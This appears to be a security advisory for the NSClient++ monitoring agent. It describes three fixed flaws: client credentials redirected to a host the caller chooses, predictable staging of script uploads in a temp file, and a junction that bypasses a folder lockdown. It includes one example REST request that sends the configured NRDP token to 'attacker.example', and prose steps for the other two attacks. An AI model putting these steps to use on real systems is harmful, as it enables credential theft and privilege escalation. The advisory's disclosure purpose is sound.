---
title: "Client credentials stay with their target, private script-upload staging, and a junction-proof shared folder"
fixed_in: next
severity: "Medium (High where the REST `monitoring` or `client` role is handed to people who must not hold the outbound credentials, or where untrusted local accounts exist on a Windows agent)"
modules: [NRDPClient, IcingaClient, SMTPClient, NSCAClient, NSCANgClient, NRPEClient, NSCPClient, GraphiteClient, SyslogClient, CheckMKClient, WEBServer, packaging, core]
action: conditional
---
A whole-codebase security review produced three items. None is exploitable
by an unauthenticated network peer on a default install; each lets a
principal one tier down act as the tier above it.

#### Configured client credentials could be redirected to a caller-chosen host

Every outbound client module (`NRDPClient`, `IcingaClient`, `SMTPClient`,
`NSCAClient`, `NSCANgClient`, `NRPEClient`, `NSCPClient`, `GraphiteClient`,
`SyslogClient`, `CheckMKClient`) registers its `submit_*` / `check_*`
commands as ordinary queries, and all of them share one argument parser.
For a request that names no target, the parser loads the module's `default`
target — the one under `[/settings/<module>/client/targets/default]`,
including its `token`, `password` or `username` — and then applies the
request's arguments on top. `host=`, `port=` and `address=` are among those
arguments and rewrite the destination while the credentials loaded from
settings stay in place.

So on an agent where an operator had configured, say, an NRDP target with a
`token`, any principal allowed to run queries could do

```
GET /api/v1/queries/submit_nrdp/commands/execute?address=http://attacker.example/nrdp/&command=x&result=0&message=x
```

and the agent would POST the configured token to `attacker.example`. Both
seeded REST roles (`monitoring` and `client`) carry `queries.execute`, and the
core permission policy is off by default, so this was reachable by a
checks-only REST user; over NRPE it needed the non-default
`allow arguments = true`. The same shape leaked the Icinga API user and
password (Basic auth), the SMTP login, the NSCA password (with a
caller-selected `encryption=xor`) and the NSCA-NG PSK (offline attack on the
handshake). The 0.18.0 fix for `--source-host` closed the *accidental* form of
this redirection; the deliberate `host`/`port`/`address` options were left in
place.

A configured target is now treated as an address **and** the credentials for
that address, as one unit. A target that carries a `password` or `token`
refuses `host=`, `port=` and `address=` from the request with an error naming
the target — the submission is not sent without the credentials, since that
would look like a server-side problem rather than a policy decision. Targets
without credentials are unaffected (the many-agents `check_nrpe host=…` use
with a client certificate keeps working: a certificate is a path, not a
transmitted secret). To reach a second server with its own credentials,
configure it as its own target and select it with `target=`. A target can opt
back in to the old behaviour with `allow host override = true`.

#### REST script uploads were staged through a predictable file in the shared temp directory

`PUT /api/v2/scripts/{ext|py|lua}/<name>` (admin only: `scripts.add.<runtime>`)
wrote the request body to `${temp}/<name>` with a plain truncating stream
whose result was never checked, then had the runtime module copy that path
into the script root and register it as a command. `${temp}` is `/tmp` on
unix and `C:\Windows\Temp` for a SYSTEM service — both world-creatable — and
the name was derived from the script name. A local unprivileged user could
therefore create that file first. On Windows (and on unix when the service
runs as root with the usual `fs.protected_regular=1`), the service's open of
the attacker-owned file was refused, the failure was silently ignored, and
the attacker's content was imported and later executed as SYSTEM/root; on
other systems the same result needed a race against the copy. Stock DEB/RPM
installs were not exploitable for code execution: the service runs as
`nsclient` and the script root is root-owned, so the import step fails. The
web UI has no script editor; the trigger is the documented REST upload.

Uploads are now staged in a randomly named file created exclusively
(`O_EXCL` / `CREATE_NEW`, never through a symlink), owner-only from the first
instant, with every write checked and the file removed once the module has
consumed it. A staging failure is reported to the caller instead of the module
being pointed at a file whose content is in doubt.

#### A pre-created junction defeated the modern-layout lockdown of `%ProgramData%\NSClient++`

Affects only the opt-in, experimental `LAYOUT=modern` install property and the
`nscp settings --migrate-layout modern` command. That layout keeps
`nsclient.ini`, the fleet private key and TLS material in
`%ProgramData%\NSClient++`, and defends against a standard user pre-creating
the folder by taking ownership and replacing its DACL. Every step of that
defence was path-based, and nothing checked for a reparse point. A standard
user can create a directory *junction* under that name without any privilege;
`create_directories` succeeds on it, `SetNamedSecurityInfo` applies the owner
and DACL to the junction's **target**, and the junction entry itself stays the
user's to delete. After the installer or migration had written the
configuration into the target, the user could remove the junction, recreate a
real folder with a crafted `nsclient.ini` (enabling, for example,
`CheckExternalScripts` and `Scheduler`), and the next service start found the
folder "open", re-protected it and loaded that configuration as SYSTEM. The
boot-time check was deliberately non-fatal.

The ACL helpers now open the directory entry itself (`FILE_FLAG_OPEN_REPARSE_POINT`),
refuse anything that is a reparse point or not a plain directory, and apply
ownership and DACL through that handle, so the object secured is provably
the object named. The installer's `ExecPrepareLayout` and the migration
command therefore fail on a planted junction instead of adopting it. At
service start on the modern layout, a shared folder that is a junction or
symbolic link is a fatal error: the configuration is never read from behind a
link. Legacy (default) installs are unaffected.

**What to do:**

- **Client targets:** nothing for the common case. If you run `nscp client`,
  REST queries or NRPE checks that pass `host=`/`port=`/`address=` against a
  target that carries a password or token, they now fail with a clear error.
  Either configure the other host as its own target and select it with
  `target=`, or set `allow host override = true` on the target — knowing that
  every principal allowed to run that module's commands can then send its
  credentials to any host they name.
- **Script uploads:** nothing; the endpoint's contract is unchanged.
- **Modern layout:** a shared folder that is a junction will refuse to
  install, migrate or boot. Relocate the folder with a `[paths]` override in
  `boot.ini` instead of a junction. Hosts on the legacy layout need nothing.
